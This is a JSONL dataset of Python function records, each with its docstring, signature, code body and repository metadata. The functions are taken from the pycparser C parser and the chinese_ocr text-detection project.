{"docstring": "\"\"\" Parse the configuration file and yield pairs of\n    (name, contents) for each node.\n\"\"\"\n", "func_signal": "def parse_cfgfile(self, filename):\n", "code": "with open(filename, \"r\") as f:\n    for line in f:\n        line = line.strip()\n        if not line or line.startswith('#'):\n            continue\n        colon_i = line.find(':')\n        lbracket_i = line.find('[')\n        rbracket_i = line.find(']')\n        if colon_i < 1 or lbracket_i <= colon_i or rbracket_i <= lbracket_i:\n            raise RuntimeError(\"Invalid line in %s:\\n%s\\n\" % (filename, line))\n\n        name = line[:colon_i]\n        val = line[lbracket_i + 1:rbracket_i]\n        vallist = [v.strip() for v in val.split(',')] if val else []\n        yield name, vallist", "path": "pycparser/pycparser/_ast_gen.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\"\nGet the representation of an object, with dedicated pprint-like format for lists.\n\"\"\"\n", "func_signal": "def _repr(obj):\n", "code": "if isinstance(obj, list):\n    return '[' + (',\\n '.join((_repr(e).replace('\\n', '\\n ') for e in obj))) + '\\n]'\nelse:\n    return repr(obj)", "path": "pycparser/pycparser/_ast_gen.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Visit a node.\n\"\"\"\n\n", "func_signal": "def visit(self, node):\n", "code": "if self._method_cache is None:\n    self._method_cache = {}\n\nvisitor = self._method_cache.get(node.__class__.__name__, None)\nif visitor is None:\n    method = 'visit_' + node.__class__.__name__\n    visitor = getattr(self, method, self.generic_visit)\n    self._method_cache[node.__class__.__name__] = visitor\n\nreturn visitor(node)", "path": "pycparser/pycparser/c_ast.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Recursively convert an ast into dict representation. \"\"\"\n", "func_signal": "def to_dict(node):\n", "code": "klass = node.__class__\n\nresult = {}\n\n# Metadata\nresult['_nodetype'] = klass.__name__\n\n# Local node attributes\nfor attr in klass.attr_names:\n    result[attr] = getattr(node, attr)\n\n# Coord object\nif node.coord:\n    result['coord'] = str(node.coord)\nelse:\n    result['coord'] = None\n\n# Child attributes\nfor child_name, child in node.children():\n    # Child strings are either simple (e.g. 'value') or arrays (e.g. 'block_items[1]')\n    match = RE_CHILD_ARRAY.match(child_name)\n    if match:\n        array_name, array_index = match.groups()\n        array_index = int(array_index)\n        # arrays come in order, so we verify and append.\n        result[array_name] = result.get(array_name, [])\n        if array_index != len(result[array_name]):\n            raise CJsonError('Internal ast error. Array {} out of order. '\n                'Expected index {}, got {}'.format(\n                array_name, len(result[array_name]), array_index))\n        result[array_name].append(to_dict(child))\n    else:\n        result[child_name] = to_dict(child)\n\n# Any child attributes that were missing need \"None\" values in the json.\nfor child_attr in child_attrs_of(klass):\n    if child_attr not in result:\n        result[child_attr] = None\n\nreturn result", "path": "pycparser/examples/c_json.py", "commit_date": "2017-03-05 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Called if no explicit visitor function exists for a\n    node. Implements preorder visiting of the node.\n\"\"\"\n", "func_signal": "def generic_visit(self, node):\n", "code": "for c in node:\n    self.visit(c)", "path": "pycparser/pycparser/c_ast.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Parse coord string (file:line[:column]) into Coord object. \"\"\"\n", "func_signal": "def _parse_coord(coord_str):\n", "code": "if coord_str is None:\n    return None\n\nvals = coord_str.split(':')\nvals.extend([None] * 3)\nfilename, line, column = vals[:3]\nreturn Coord(filename, line, column)", "path": "pycparser/examples/c_json.py", "commit_date": "2017-03-05 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Visit a node.\n\"\"\"\n\n", "func_signal": "def visit(self, node):\n", "code": "if self._method_cache is None:\n    self._method_cache = {}\n\nvisitor = self._method_cache.get(node.__class__.__name__, None)\nif visitor is None:\n    method = 'visit_' + node.__class__.__name__\n    visitor = getattr(self, method, self.generic_visit)\n    self._method_cache[node.__class__.__name__] = visitor\n\nreturn visitor(node)", "path": "pycparser/pycparser/_ast_gen.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Load C file into json string representation of ast \"\"\"\n", "func_signal": "def file_to_json(filename, **kwargs):\n", "code": "ast = parse_file(filename, use_cpp=True)\nreturn to_json(ast, **kwargs)", "path": "pycparser/examples/c_json.py", "commit_date": "2017-03-05 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\"\nGet the representation of an object, with dedicated pprint-like format for lists.\n\"\"\"\n", "func_signal": "def _repr(obj):\n", "code": "if isinstance(obj, list):\n    return '[' + (',\\n '.join((_repr(e).replace('\\n', '\\n ') for e in obj))) + '\\n]'\nelse:\n    return repr(obj)", "path": "pycparser/pycparser/c_ast.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Load C file into dict representation of ast \"\"\"\n", "func_signal": "def file_to_dict(filename):\n", "code": "ast = parse_file(filename, use_cpp=True)\nreturn to_dict(ast)", "path": "pycparser/examples/c_json.py", "commit_date": "2017-03-05 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Generates a python representation of the current node\n\"\"\"\n", "func_signal": "def __repr__(self):\n", "code": "result = self.__class__.__name__ + '('\n\nindent = ''\nseparator = ''\nfor name in self.__slots__[:-2]:\n    result += separator\n    result += indent\n    result += name + '=' + (_repr(getattr(self, name)).replace('\\n', '\\n  ' + (' ' * (len(name) + len(self.__class__.__name__)))))\n\n    separator = ','\n    indent = '\\n ' + (' ' * len(self.__class__.__name__))\n\nresult += indent + ')'\n\nreturn result", "path": "pycparser/pycparser/_ast_gen.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Recursively build an ast from dict representation \"\"\"\n", "func_signal": "def from_dict(node_dict):\n", "code": "class_name = node_dict.pop('_nodetype')\n\nklass = getattr(c_ast, class_name)\n\n# Create a new dict containing the key-value pairs which we can pass\n# to node constructors.\nobjs = {}\nfor key, value in node_dict.items():\n    if key == 'coord':\n        objs[key] = _parse_coord(value)\n    else:\n        objs[key] = _convert_to_obj(value)\n\n# Use keyword parameters, which works thanks to beautifully consistent\n# ast Node initializers.\nreturn klass(**objs)", "path": "pycparser/examples/c_json.py", "commit_date": "2017-03-05 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Generates the code into file, an open file buffer.\n\"\"\"\n", "func_signal": "def generate(self, file=None):\n", "code": "src = Template(_PROLOGUE_COMMENT).substitute(\n    cfg_filename=self.cfg_filename)\n\nsrc += _PROLOGUE_CODE\nfor node_cfg in self.node_cfg:\n    src += node_cfg.generate_source() + '\\n\\n'\n\nfile.write(src)", "path": "pycparser/pycparser/_ast_gen.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\"Convert a list of images into a network input.\n\nAssumes images are already prepared (means subtracted, BGR order, ...).\n\"\"\"\n", "func_signal": "def im_list_to_blob(ims):\n", "code": "max_shape = np.array([im.shape for im in ims]).max(axis=0)\nnum_images = len(ims)\nblob = np.zeros((num_images, max_shape[0], max_shape[1], 3),\n                dtype=np.float32)\nfor i in range(num_images):\n    im = ims[i]\n    blob[i, 0:im.shape[0], 0:im.shape[1], :] = im\n\nreturn blob", "path": "chinese_ocr/ctpn/lib/utils/blob.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"Get a network by name.\"\"\"\n", "func_signal": "def get_network(name):\n", "code": "if name.split('_')[0] == 'VGGnet':\n    if name.split('_')[1] == 'test':\n       return VGGnet_test()\n    elif name.split('_')[1] == 'train':\n       return VGGnet_train()\n    else:\n       raise KeyError('Unknown dataset: {}'.format(name))\nelse:\n    raise KeyError('Unknown dataset: {}'.format(name))", "path": "chinese_ocr/ctpn/lib/networks/factory.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"Load a config file and merge it into the default options.\"\"\"\n", "func_signal": "def cfg_from_file(filename):\n", "code": "import yaml\nwith open(filename, 'r') as f:\n    yaml_cfg = edict(yaml.load(f))\n\n_merge_a_into_b(yaml_cfg, __C)", "path": "chinese_ocr/ctpn/lib/fast_rcnn/config.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"\nClip boxes to image boundaries.\n\"\"\"\n", "func_signal": "def clip_boxes(boxes, im_shape):\n", "code": "boxes[:, 0::2]=threshold(boxes[:, 0::2], 0, im_shape[1]-1)\nboxes[:, 1::2]=threshold(boxes[:, 1::2], 0, im_shape[0]-1)\nreturn boxes", "path": "chinese_ocr/ctpn/lib/text_connector/other.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"Mean subtract and scale an image for use in a blob.\"\"\"\n", "func_signal": "def prep_im_for_blob(im, pixel_means, target_size, max_size):\n", "code": "im = im.astype(np.float32, copy=False)\nim -= pixel_means\nim_shape = im.shape\nim_size_min = np.min(im_shape[0:2])\nim_size_max = np.max(im_shape[0:2])\nim_scale = float(target_size) / float(im_size_min)\n# Prevent the biggest axis from being more than MAX_SIZE\nif np.round(im_scale * im_size_max) > max_size:\n    im_scale = float(max_size) / float(im_size_max)\nif cfg.TRAIN.RANDOM_DOWNSAMPLE:\n    r = 0.6 + np.random.rand() * 0.4\n    im_scale *= r\nim = cv2.resize(im, None, None, fx=im_scale, fy=im_scale,\n                interpolation=cv2.INTER_LINEAR)\n\nreturn im, im_scale", "path": "chinese_ocr/ctpn/lib/utils/blob.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"Return the directory where experimental artifacts are placed.\nIf the directory does not exist, it is created.\nA canonical path is built using the name from an imdb and a network\n(if not None).\n\"\"\"\n", "func_signal": "def get_log_dir(imdb):\n", "code": "log_dir = osp.abspath(\\\n    osp.join(__C.ROOT_DIR, 'logs', __C.LOG_DIR, imdb.name, strftime(\"%Y-%m-%d-%H-%M-%S\", localtime())))\nif not os.path.exists(log_dir):\n    os.makedirs(log_dir)\nreturn log_dir", "path": "chinese_ocr/ctpn/lib/fast_rcnn/config.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "# load config file\n", "func_signal": "def load_tf_model():\n", "code": "cfg.TEST.checkpoints_path = './ctpn/checkpoints'\n\n# init session\ngpu_options = tf.GPUOptions(per_process_gpu_memory_fraction=1.0)\nconfig = tf.ConfigProto(allow_soft_placement=True, gpu_options=gpu_options)\nsess = tf.Session(config=config)\n\n# load network\nnet = get_network(\"VGGnet_test\")\n\n# load model\nprint('Loading network {:s}... '.format(\"VGGnet_test\"))\nsaver = tf.train.Saver()\ntry:\n    ckpt = tf.train.get_checkpoint_state(cfg.TEST.checkpoints_path)\n    print('Restoring from {}...'.format(ckpt.model_checkpoint_path))\n    saver.restore(sess, ckpt.model_checkpoint_path)\n    print('done')\nexcept:\n    raise 'Check your pretrained {:s}'.format(ckpt.model_checkpoint_path)\n\nreturn sess, net", "path": "chinese_ocr/ctpn/text_detect.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"Set config keys via list (e.g., from command line).\"\"\"\n", "func_signal": "def cfg_from_list(cfg_list):\n", "code": "from ast import literal_eval\nassert len(cfg_list) % 2 == 0\nfor k, v in zip(cfg_list[0::2], cfg_list[1::2]):\n    key_list = k.split('.')\n    d = __C\n    for subkey in key_list[:-1]:\n        assert subkey in d\n        d = d[subkey]\n    subkey = key_list[-1]\n    assert subkey in d\n    try:\n        value = literal_eval(v)\n    except:\n        # handle the case when v is a string literal\n        value = v\n    assert type(value) == type(d[subkey]), \\\n        'type {} does not match original type {}'.format(\n        type(value), type(d[subkey]))\n    d[subkey] = value", "path": "chinese_ocr/ctpn/lib/fast_rcnn/config.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"\nClip boxes to image boundaries.\n\"\"\"\n\n# x1 >= 0\n", "func_signal": "def clip_boxes(boxes, im_shape):\n", "code": "boxes[:, 0::4] = np.maximum(np.minimum(boxes[:, 0::4], im_shape[1] - 1), 0)\n# y1 >= 0\nboxes[:, 1::4] = np.maximum(np.minimum(boxes[:, 1::4], im_shape[0] - 1), 0)\n# x2 < im_shape[1]\nboxes[:, 2::4] = np.maximum(np.minimum(boxes[:, 2::4], im_shape[1] - 1), 0)\n# y2 < im_shape[0]\nboxes[:, 3::4] = np.maximum(np.minimum(boxes[:, 3::4], im_shape[0] - 1), 0)\nreturn boxes", "path": "chinese_ocr/ctpn/lib/fast_rcnn/bbox_transform.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "# A roidb is a list of dictionaries, each with the following keys:\n#   boxes\n#   gt_overlaps\n#   gt_classes\n#   flipped\n", "func_signal": "def roidb(self):\n", "code": "if self._roidb is not None:\n    return self._roidb\nself._roidb = self.roidb_handler()\nreturn self._roidb", "path": "chinese_ocr/ctpn/lib/datasets/imdb.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"\ncomputes the distance from ground-truth boxes to the given boxes, normed by their size\n:param ex_rois: n * 4 numpy array, given boxes\n:param gt_rois: n * 4 numpy array, ground-truth boxes\n:return: deltas: n * 4 numpy array, ground-truth boxes\n\"\"\"\n", "func_signal": "def bbox_transform(ex_rois, gt_rois):\n", "code": "ex_widths = ex_rois[:, 2] - ex_rois[:, 0] + 1.0\nex_heights = ex_rois[:, 3] - ex_rois[:, 1] + 1.0\nex_ctr_x = ex_rois[:, 0] + 0.5 * ex_widths\nex_ctr_y = ex_rois[:, 1] + 0.5 * ex_heights\n\nassert np.min(ex_widths) > 0.1 and np.min(ex_heights) > 0.1, \\\n    'Invalid boxes found: {} {}'. \\\n        format(ex_rois[np.argmin(ex_widths), :], ex_rois[np.argmin(ex_heights), :])\n\ngt_widths = gt_rois[:, 2] - gt_rois[:, 0] + 1.0\ngt_heights = gt_rois[:, 3] - gt_rois[:, 1] + 1.0\ngt_ctr_x = gt_rois[:, 0] + 0.5 * gt_widths\ngt_ctr_y = gt_rois[:, 1] + 0.5 * gt_heights\n\n# warnings.catch_warnings()\n# warnings.filterwarnings('error')\ntargets_dx = (gt_ctr_x - ex_ctr_x) / ex_widths\ntargets_dy = (gt_ctr_y - ex_ctr_y) / ex_heights\ntargets_dw = np.log(gt_widths / ex_widths)\ntargets_dh = np.log(gt_heights / ex_heights)\n\ntargets = np.vstack(\n    (targets_dx, targets_dy, targets_dw, targets_dh)).transpose()\n\nreturn targets", "path": "chinese_ocr/ctpn/lib/fast_rcnn/bbox_transform.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"\n@img: \u56fe\u7247\n@adjust: \u662f\u5426\u8c03\u6574\u6587\u5b57\u8bc6\u522b\u7ed3\u679c\n\"\"\"\n", "func_signal": "def model(img, adjust=False):\n", "code": "cfg_from_file('./ctpn/ctpn/text.yml')\ntext_recs, img_framed, img = text_detect(img)\ntext_recs = sort_box(text_recs)\nresult = charRec(img, text_recs, adjust)\nreturn result, img_framed", "path": "chinese_ocr/ocr.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\" \n\u5bf9box\u8fdb\u884c\u6392\u5e8f\n\"\"\"\n", "func_signal": "def sort_box(box):\n", "code": "box = sorted(box, key=lambda x: sum([x[1], x[3], x[5], x[7]]))\nreturn box", "path": "chinese_ocr/ocr.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"Return the directory where experimental artifacts are placed.\nIf the directory does not exist, it is created.\n\nA canonical path is built using the name from an imdb and a network\n(if not None).\n\"\"\"\n", "func_signal": "def get_output_dir(imdb, weights_filename):\n", "code": "outdir = osp.abspath(osp.join(__C.ROOT_DIR, 'output', __C.EXP_DIR, imdb.name))\nif weights_filename is not None:\n    outdir = osp.join(outdir, weights_filename)\nif not os.path.exists(outdir):\n    os.makedirs(outdir)\nreturn outdir", "path": "chinese_ocr/ctpn/lib/fast_rcnn/config.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"Remove all boxes with any side smaller than min_size.\"\"\"\n", "func_signal": "def _filter_boxes(boxes, min_size):\n", "code": "ws = boxes[:, 2] - boxes[:, 0] + 1\nhs = boxes[:, 3] - boxes[:, 1] + 1\nkeep = np.where((ws >= min_size) & (hs >= min_size))[0]\nreturn keep", "path": "chinese_ocr/ctpn/lib/rpn_msr/proposal_layer_tf.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"Merge config dictionary a into config dictionary b, clobbering the\noptions in b whenever they are also specified in a.\n\"\"\"\n", "func_signal": "def _merge_a_into_b(a, b):\n", "code": "if type(a) is not edict:\n    return\n\nfor k, v in a.items():\n    # a must specify keys that are in b\n    if k not in b:\n        raise KeyError('{} is not a valid config key'.format(k))\n\n    # the types must match, too\n    old_type = type(b[k])\n    if old_type is not type(v):\n        if isinstance(b[k], np.ndarray):\n            v = np.array(v, dtype=b[k].dtype)\n        else:\n            raise ValueError(('Type mismatch ({} vs. {}) '\n                            'for config key: {}').format(type(b[k]),\n                                                        type(v), k))\n\n    # recursively merge dicts\n    if type(v) is edict:\n        try:\n            _merge_a_into_b(a[k], b[k])\n        except:\n            print(('Error under config key: {}'.format(k)))\n            raise\n    else:\n        b[k] = v", "path": "chinese_ocr/ctpn/lib/fast_rcnn/config.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"\n\u52a0\u8f7dOCR\u6a21\u578b\uff0c\u8fdb\u884c\u5b57\u7b26\u8bc6\u522b\n\"\"\"\n", "func_signal": "def charRec(img, text_recs, adjust=False):\n", "code": "results = {}\nxDim, yDim = img.shape[1], img.shape[0]\n \nfor index, rec in enumerate(text_recs):\n    xlength = int((rec[6] - rec[0]) * 0.1)\n    ylength = int((rec[7] - rec[1]) * 0.2)\n    if adjust:\n        pt1 = (max(1, rec[0] - xlength), max(1, rec[1] - ylength))\n        pt2 = (rec[2], rec[3])\n        pt3 = (min(rec[6] + xlength, xDim - 2), min(yDim - 2, rec[7] + ylength))\n        pt4 = (rec[4], rec[5])\n    else:\n        pt1 = (max(1, rec[0]), max(1, rec[1]))\n        pt2 = (rec[2], rec[3])\n        pt3 = (min(rec[6], xDim - 2), min(yDim - 2, rec[7]))\n        pt4 = (rec[4], rec[5])\n     \n    degree = degrees(atan2(pt2[1] - pt1[1], pt2[0] - pt1[0]))  # \u56fe\u50cf\u503e\u659c\u89d2\u5ea6\n\n    partImg = dumpRotateImage(img, degree, pt1, pt2, pt3, pt4)\n\n    if partImg.shape[0] < 1 or partImg.shape[1] < 1 or partImg.shape[0] > partImg.shape[1]:  # \u8fc7\u6ee4\u5f02\u5e38\u56fe\u7247\n        continue\n\n    image = Image.fromarray(partImg).convert('L')\n    text = keras_densenet(image)\n    \n    if len(text) > 0:\n        results[index] = [rec]\n        results[index].append(text)  # \u8bc6\u522b\u6587\u5b57\n \nreturn results", "path": "chinese_ocr/ocr.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"\nParameters\n----------\nrpn_cls_prob_reshape: (1 , H , W , Ax2) outputs of RPN, prob of bg or fg\n                     NOTICE: the old version is ordered by (1, H, W, 2, A) !!!!\nrpn_bbox_pred: (1 , H , W , Ax4), rgs boxes output of RPN\nim_info: a list of [image_height, image_width, scale_ratios]\ncfg_key: 'TRAIN' or 'TEST'\n_feat_stride: the downsampling ratio of feature map to the original input image\nanchor_scales: the scales to the basic_anchor (basic anchor is [16, 16])\n----------\nReturns\n----------\nrpn_rois : (1 x H x W x A, 5) e.g. [0, x1, y1, x2, y2]\n\n# Algorithm:\n#\n# for each (H, W) location i\n#   generate A anchor boxes centered on cell i\n#   apply predicted bbox deltas at cell i to each of the A anchors\n# clip predicted boxes to image\n# remove predicted boxes with either height or width < threshold\n# sort all (proposal, score) pairs by score from highest to lowest\n# take top pre_nms_topN proposals before NMS\n# apply NMS with threshold 0.7 to remaining proposals\n# take after_nms_topN proposals after NMS\n# return the top proposals (-> RoIs top, scores top)\n#layer_params = yaml.load(self.param_str_)\n\n\"\"\"\n", "func_signal": "def proposal_layer(rpn_cls_prob_reshape, rpn_bbox_pred, im_info, cfg_key, _feat_stride = [16,], anchor_scales = [16,]):\n", "code": "cfg_key=cfg_key.decode('ascii')\n_anchors = generate_anchors(scales=np.array(anchor_scales))#\u751f\u6210\u57fa\u672c\u76849\u4e2aanchor\n_num_anchors = _anchors.shape[0]#9\u4e2aanchor\n\nim_info = im_info[0]#\u539f\u59cb\u56fe\u50cf\u7684\u9ad8\u5bbd\u3001\u7f29\u653e\u5c3a\u5ea6\n\nassert rpn_cls_prob_reshape.shape[0] == 1, \\\n    'Only single item batches are supported'\n\npre_nms_topN  = cfg[cfg_key].RPN_PRE_NMS_TOP_N#12000,\u5728\u505anms\u4e4b\u524d\uff0c\u6700\u591a\u4fdd\u7559\u7684\u5019\u9009box\u6570\u76ee\npost_nms_topN = cfg[cfg_key].RPN_POST_NMS_TOP_N#2000\uff0c\u505a\u5b8cnms\u4e4b\u540e\uff0c\u6700\u591a\u4fdd\u7559\u7684box\u7684\u6570\u76ee\nnms_thresh    = cfg[cfg_key].RPN_NMS_THRESH#nms\u7528\u53c2\u6570\uff0c\u9608\u503c\u662f0.7\nmin_size      = cfg[cfg_key].RPN_MIN_SIZE#\u5019\u9009box\u7684\u6700\u5c0f\u5c3a\u5bf8\uff0c\u76ee\u524d\u662f16\uff0c\u9ad8\u5bbd\u5747\u8981\u5927\u4e8e16\n#TODO \u540e\u671f\u9700\u8981\u4fee\u6539\u8fd9\u4e2a\u6700\u5c0f\u5c3a\u5bf8\uff0c\u6539\u4e3a8\uff1f\n\nheight, width = rpn_cls_prob_reshape.shape[1:3]#feature-map\u7684\u9ad8\u5bbd\n\n# the first set of _num_anchors channels are bg probs\n# the second set are the fg probs, which we want\n# (1, H, W, A)\nscores = np.reshape(np.reshape(rpn_cls_prob_reshape, [1, height, width, _num_anchors, 2])[:,:,:,:,1],\n                    [1, height, width, _num_anchors])\n#\u63d0\u53d6\u5230object\u7684\u5206\u6570\uff0cnon-object\u7684\u6211\u4eec\u4e0d\u5173\u5fc3\n#\u5e76reshape\u52301*H*W*9\n\nbbox_deltas = rpn_bbox_pred#\u6a21\u578b\u8f93\u51fa\u7684pred\u662f\u76f8\u5bf9\u503c\uff0c\u9700\u8981\u8fdb\u4e00\u6b65\u5904\u7406\u6210\u771f\u5b9e\u56fe\u50cf\u4e2d\u7684\u5750\u6807\n#im_info = bottom[2].data[0, :]\n\nif DEBUG:\n    print('im_size: ({}, {})'.format(im_info[0], im_info[1]))\n    print('scale: {}'.format(im_info[2]))\n\n# 1. Generate proposals from bbox deltas and shifted anchors\nif DEBUG:\n    print('score map size: {}'.format(scores.shape))\n\n# Enumerate all shifts\n# \u540canchor-target-layer-tf\u8fd9\u4e2a\u6587\u4ef6\u4e00\u6837\uff0c\u751f\u6210anchor\u7684shift\uff0c\u8fdb\u4e00\u6b65\u5f97\u5230\u6574\u5f20\u56fe\u50cf\u4e0a\u7684\u6240\u6709anchor\nshift_x = np.arange(0, width) * _feat_stride\nshift_y = np.arange(0, height) * _feat_stride\nshift_x, shift_y = np.meshgrid(shift_x, shift_y)\nshifts = np.vstack((shift_x.ravel(), shift_y.ravel(),\n                    shift_x.ravel(), shift_y.ravel())).transpose()\n\n# Enumerate all shifted anchors:\n#\n# add A anchors (1, A, 4) to\n# cell K shifts (K, 1, 4) to get\n# shift anchors (K, A, 4)\n# reshape to (K*A, 4) shifted anchors\nA = _num_anchors\nK = shifts.shape[0]\nanchors = _anchors.reshape((1, A, 4)) + \\\n          shifts.reshape((1, K, 4)).transpose((1, 0, 2))\nanchors = anchors.reshape((K * A, 4))#\u8fd9\u91cc\u5f97\u5230\u7684anchor\u5c31\u662f\u6574\u5f20\u56fe\u50cf\u4e0a\u7684\u6240\u6709anchor\n\n# Transpose and reshape predicted bbox transformations to get them\n# into the same order as the anchors:\n# bbox deltas will be (1, 4 * A, H, W) format\n# transpose to (1, H, W, 4 * A)\n# reshape to (1 * H * W * A, 4) where rows are ordered by (h, w, a)\n# in slowest to fastest order\nbbox_deltas = bbox_deltas.reshape((-1, 4)) #(HxWxA, 4)\n\n# Same story for the scores:\nscores = scores.reshape((-1, 1))\n\n# Convert anchors into proposals via bbox transformations\nproposals = bbox_transform_inv(anchors, bbox_deltas)#\u505a\u9006\u53d8\u6362\uff0c\u5f97\u5230box\u5728\u56fe\u50cf\u4e0a\u7684\u771f\u5b9e\u5750\u6807\n\n# 2. clip predicted boxes to image\nproposals = clip_boxes(proposals, im_info[:2])#\u5c06\u6240\u6709\u7684proposal\u4fee\u5efa\u4e00\u4e0b\uff0c\u8d85\u51fa\u56fe\u50cf\u8303\u56f4\u7684\u5c06\u4f1a\u88ab\u4fee\u526a\u6389\n\n# 3. remove predicted boxes with either height or width < threshold\n# (NOTE: convert min_size to input image scale stored in im_info[2])\nkeep = _filter_boxes(proposals, min_size * im_info[2])#\u79fb\u9664\u90a3\u4e9bproposal\u5c0f\u4e8e\u4e00\u5b9a\u5c3a\u5bf8\u7684proposal\nproposals = proposals[keep, :]#\u4fdd\u7559\u5269\u4e0b\u7684proposal\nscores = scores[keep]\nbbox_deltas=bbox_deltas[keep,:]\n\n\n# # remove irregular boxes, too fat too tall\n# keep = _filter_irregular_boxes(proposals)\n# proposals = proposals[keep, :]\n# scores = scores[keep]\n\n# 4. sort all (proposal, score) pairs by score from highest to lowest\n# 5. take top pre_nms_topN (e.g. 6000)\norder = scores.ravel().argsort()[::-1]#score\u6309\u5f97\u5206\u7684\u9ad8\u4f4e\u8fdb\u884c\u6392\u5e8f\nif pre_nms_topN > 0:                #\u4fdd\u755912000\u4e2aproposal\u8fdb\u53bb\u505anms\n    order = order[:pre_nms_topN]\nproposals = proposals[order, :]\nscores = scores[order]\nbbox_deltas=bbox_deltas[order,:]\n\n\n# 6. apply nms (e.g. threshold = 0.7)\n# 7. take after_nms_topN (e.g. 300)\n# 8. return the top proposals (-> RoIs top)\nkeep = nms(np.hstack((proposals, scores)), nms_thresh)#\u8fdb\u884cnms\u64cd\u4f5c\uff0c\u4fdd\u75592000\u4e2aproposal\nif post_nms_topN > 0:\n    keep = keep[:post_nms_topN]\nproposals = proposals[keep, :]\nscores = scores[keep]\nbbox_deltas=bbox_deltas[keep,:]\n\n\n# Output rois blob\n# Our RPN implementation only supports a single input image, so all\n# batch inds are 0\nblob = np.hstack((scores.astype(np.float32, copy=False), proposals.astype(np.float32, copy=False)))\n\nreturn blob,bbox_deltas", "path": "chinese_ocr/ctpn/lib/rpn_msr/proposal_layer_tf.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
{"docstring": "\"\"\"Get an imdb (image database) by name.\"\"\"\n", "func_signal": "def get_imdb(name):\n", "code": "if name not in __sets:\n    print((list_imdbs()))\n    raise KeyError('Unknown dataset: {}'.format(name))\nreturn __sets[name]()", "path": "chinese_ocr/ctpn/lib/datasets/factory.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "YCG09/chinese_ocr", "stars": 2705, "license": "apache-2.0", "language": "python", "size": 92115}
